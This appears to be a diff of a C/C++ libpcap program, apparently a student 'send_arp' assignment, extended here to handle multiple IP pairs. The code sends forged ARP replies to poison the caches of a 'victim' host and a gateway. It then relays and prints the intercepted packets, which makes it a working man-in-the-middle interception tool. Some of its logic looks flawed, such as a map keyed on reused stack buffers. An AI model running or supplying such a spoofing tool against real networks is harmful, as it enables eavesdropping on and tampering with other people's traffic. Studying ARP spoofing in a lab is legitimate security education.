@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <string.h>
+#include <iostream>
 #include <pcap.h>
 #include <net/ethernet.h>
 #include <arpa/inet.h>
@@ -8,7 +9,11 @@
 #include <sys/ioctl.h>
 #include <linux/if.h>
 #include <netdb.h>
+#include <map>
+#include <utility>
+#include "func.h"
 
+using namespace std;
 
 struct packet{
 	//ethernet header
@@ -34,6 +39,32 @@ struct packet packet; //define packet
 uint8_t my_mac[6];
 uint8_t my_ip[4];
 uint8_t sender_mac[6];
+uint8_t dest_mac[6];
+uint8_t sender_ip[4];
+uint8_t target_ip[4];
+uint8_t target_mac[6];
+
+map<uint8_t*,uint8_t*> m;
+
+/*store sender ip target ip*/
+
+void store_ip(char* argv[],int len){
+
+	uint8_t result_a[4];
+	uint8_t result_b[4];
+	for(int i=2;i < len ;i+=2){
+		parseIP(result_a,argv[i]);
+		parseIP(result_b,argv[i+1]);
+		m.insert(make_pair(result_a,result_b));
+	}
+	auto iter = m.begin();
+	for(int i=0;i<4;i++){
+		printf("%02x.",iter->first[i]);
+	}
+	for(int i=0;i<4;i++){
+		printf("%02x.",result_a[i]);
+	}
+}
 
 /* get my ip address and mac address */
 void get_my_info(char *dev){
@@ -58,8 +89,8 @@ int make_and_send_packet(
 	pcap_t * fp,
 	uint8_t dest_mac[],
 	uint8_t src_mac[],
-	uint8_t sender_ip[],
-	uint8_t target_ip[],
+	uint8_t sender_ip[4],
+	uint8_t target_ip[4],
 	uint8_t target_mac[],
 	uint16_t opcode//request or reply
 	)
@@ -93,42 +124,77 @@ int make_and_send_packet(
 void parseIP(uint8_t *result, char* source){
 	int temp =0;
 	int integer = 0;
-
-	for(int i=0 ;i<strlen(source);i++){
+	int len = strlen(source);
+	for(int i=0 ;i<len;i++){
 		if(source[i]!='.'){
 			integer*=10;
-			integer += source[i]-'0';
+			integer+=source[i]-'0';
 		}else{
-			result[temp++]=integer;
+			result[temp]=integer;
+			temp++;
 			integer=0;
 		}
 	}
 	result[temp] = integer;
 }
 
-
-bool check_ip(uint8_t * ip,const u_char* check){
-
-	for(int i=0;i<4;i++){
-		if(ip[i]!=check[i+28]) return false;
-		else return true;
+void broadcast_request(pcap_t * handle,bool check){
+	if(check){
+		/* send broadcast request to get victim's mac address */			
+		for(int i=0;i<6;i++){
+			dest_mac[i] =0xff;
+		}
+		for(int i=0;i<6;i++){
+			target_mac[i] = 0x00;
+		}
+		if(make_and_send_packet(handle,dest_mac,my_mac,my_ip,sender_ip,target_mac,0x0001) !=0){
+			printf("send broadcast request packet failed!\n");	
+		}else{
+			printf("send broadcast request packet to sender_ip success!!\n");
+		};
+	}else{
+		/* send broadcast request to get target's  address */
+		if(make_and_send_packet(handle,dest_mac,my_mac,my_ip,target_ip,target_mac,0x0001) !=0){
+			printf("send broadcast request packet failed!\n");	
+		}else{
+			printf("send broadcast request packet to target_ip success!!\n");
+		};
 	}
-
 }
+
+
+bool check_ip(uint8_t *ip,const u_char* check,bool isARP,bool isDest){ //is victim's packet and it is sended to me?
+
+	if(isARP){
+		for(int i=0;i<4;i++){
+			if(ip[i]!=check[i+28]) return false;
+		}
+		for(int i=0;i<4;i++){
+			if(my_ip[i]!=check[i+38]) return false;
+		}
+	}else{
+		if(isDest){
+			for(int i=0;i<4;i++){
+				if(ip[i]!=check[i+30]) return false;
+			}
+		}else{
+			for(int i=0;i<4;i++){
+				if(ip[i]!=check[i+26]) return false;
+			}
+		}
+	}
+	return true;
+}
+
 
 int main(int argc, char* argv[])
 {
-	uint8_t dest_mac[6];
-	uint8_t sender_ip[4];
-	uint8_t target_ip[4];
-	uint8_t target_mac[6];
-
-	parseIP(sender_ip,argv[2]);
-	parseIP(target_ip,argv[3]);
-	if (argc !=4){
-		printf("send_arp <interface> <sender ip> <target ip>");
+	if (argc <4){
+		printf("send_arp <interface> <sender ip> <target ip> <sender_ip> <target_ip> ....");
 		return -1;
 	}
+	int sender_target_len = (argc-2)/2;//sender and target's ip pair length
+	store_ip(argv,argc);
 
 	char* dev = argv[1];
 
@@ -138,26 +204,39 @@ int main(int argc, char* argv[])
 		fprintf(stderr, "couldn't open device %s: %s\n",dev, errbuf);
 		return -1;
 	}
-
 	/*get my info*/
 	get_my_info(dev);
-
-	/* send broadcast request to get victim's mac address */
-	for(int i=0;i<6;i++){
-		dest_mac[i] =0xff;
-	}
-	for(int i=0;i<6;i++){
-		target_mac[i] = 0x00;
-	}
-	if(make_and_send_packet(handle,dest_mac,my_mac,my_ip,sender_ip,target_mac,0x0001) !=0){
-	printf("send broadcast request packet failed!\n");	
-	}else{
-		printf("send broadcast request packet success!!\n");
-	};
-	
+	/*frequency of send broadcast request and change spoofing target*/
+	int loop=0;
+	int check_loop=0;
+	auto iter = m.begin();
 	/*take target's mac address*/
 	while(true){
-		printf("\nsniff....\n");
+		printf("\n----------------------sniff----------------------\n");
+		/*change spoof target ip*/
+		if(check_loop<sender_target_len){
+			for(int i=0;i<4;i++){
+				sender_ip[i] = iter->first[i];
+				target_ip[i] = iter->second[i];
+			}
+			for(int i=0;i<4;i++){
+				printf("%02x.",sender_ip[i]);
+			}
+			for(int i=0;i<4;i++){
+				printf("%02x.",target_ip[i]);
+			}
+			iter++;
+			check_loop++;
+		}else{
+			check_loop=0;
+			iter=m.begin();
+		}
+		if(loop==0){
+			broadcast_request(handle,true);
+		}else if(loop==1){
+			broadcast_request(handle,false);
+		}else if(loop==5) loop=-1;
+		loop++;
 		struct pcap_pkthdr* header;
 		const u_char* packet;
 		u_char* dummy;
@@ -171,35 +250,44 @@ int main(int argc, char* argv[])
 		type[1] = packet[13];
 		opcode[0]=packet[20];
 		opcode[1]=packet[21];
-		/*print some packet data in received packet*/
-		printf("%d\n",packet_len);
-		for(int i =0;i<packet_len;i++){
-			printf("%02x ",packet[i]);
-			if(i%8==7)printf("\n");
-		}
 		
 		if(type[0]==0x08 &&type[1]==0x06){ //is type == arp ?
 			if(opcode[0]==0x00 &&opcode[1]==0x02){//is opcode is reply?
-				if(check_ip(sender_ip,packet)){//is victim's recovery?
-					/*send reply to victim*/
-					if(make_and_send_packet(handle,sender_mac,my_mac,target_ip,sender_ip,target_mac,0x0002)!=0){
-						printf("\nsend arp reply packet to victim failed!\n");
+				/*take mac address*/
+			
+				if(check_ip(sender_ip,packet,true/*isARP?*/,false/*isDest*/)){//is victim's recovery?
+					/*copy victim mac address to sender_mac*/
+					for(int i=0;i<6;i++){
+						sender_mac[i] = packet[i+6];
+					}
+
+					//dest_mac, src_mac, sender_ip, target_ip, target_mac
+
+					if(make_and_send_packet(handle,sender_mac,my_mac,target_ip,sender_ip,sender_mac,0x0002)!=0){
+						printf("\nsend arp reply packet to sender failed!\n");
 					}else{
-						printf("\nsend arp reply packet to victim success!\n");
+						printf("\nsend arp reply packet to sender success!\n");
 					}	
-				}else if(check_ip(target_ip,packet)){//is gateway's recovery?
-					if(make_and_send_packet(handle,sender_mac,my_mac,target_ip,sender_ip,target_mac,0x0002)!=0){
-						printf("\nsend arp reply packet to victim failed!\n");
+				}else if(check_ip(target_ip,packet,true,false)){//is gateway's recovery?
+					/*copy gateway mac address to target_mac*/
+					for(int i=0;i<6;i++){
+						target_mac[i] = packet[i+6];
+					}
+					if(make_and_send_packet(handle,target_mac,my_mac,sender_ip,target_ip,target_mac,0x0002)!=0){
+						printf("\nsend arp reply packet to gateway failed!\n");
 					}else{
-						printf("\nsend arp reply packet to victim success!\n");
+						printf("\nsend arp reply packet to gateway success!\n");
 					}
 
 				}	
 			}
-		}else{ //relay 
+		}else{ //relay
+			/*print some packet data in received packet*/
+			printf("%d\n",packet_len);
 			dummy=(u_char*)packet; //copy packet to dummy(non constant variable)
-			if(check_ip(sender_ip,packet)){ //if victim's packet
-				printf("relay victim's packet!!\n");
+
+			if(check_ip(sender_ip,packet,false,true)){ //if dest is victim's ip
+				printf("---------------relay to victim's packet---------------\n");
 				for(int i=0;i<6;i++){
 					dummy[i+6]=my_mac[i];
 				}
@@ -209,24 +297,29 @@ int main(int argc, char* argv[])
 						printf("\n");
 					}
 				}
-				pcap_sendpacket(handle,dummy,packet_len);
+				if(pcap_sendpacket(handle,dummy,packet_len)!=0){
+					printf("error with sending relay packet to gateway");	
+				}
 
-			}else if(check_ip(target_ip,packet)){//if gateway's packet
-				printf("relay gateway's packet!!\n");
+			}else if(check_ip(sender_ip,packet,false,false)){ //if src is victim's ip
+				printf("--------------relay from victim's packet---------------\n");
 				for(int i=0;i<6;i++){
 					dummy[i+6]=my_mac[i];
 				}
-				for(int i=0;i<packet_len;i++){
+				for(int i=0;i<packet_len;i++){ //print packet
 					printf("%02x ",packet[i]);
 					if(i%8==7){
 						printf("\n");
 					}
 				}
-				pcap_sendpacket(handle,dummy,packet_len);
+				if(pcap_sendpacket(handle,dummy,packet_len)!=0){
+					printf("error with sending relay packet to gateway");	
+				}
+			}else{
+				printf("It is not victim's packet!\n");
 			}
-
-	
-		}	
+		}
+				printf("\n---------------------end------------------------\n\n\n");	
 	}
 	
 }
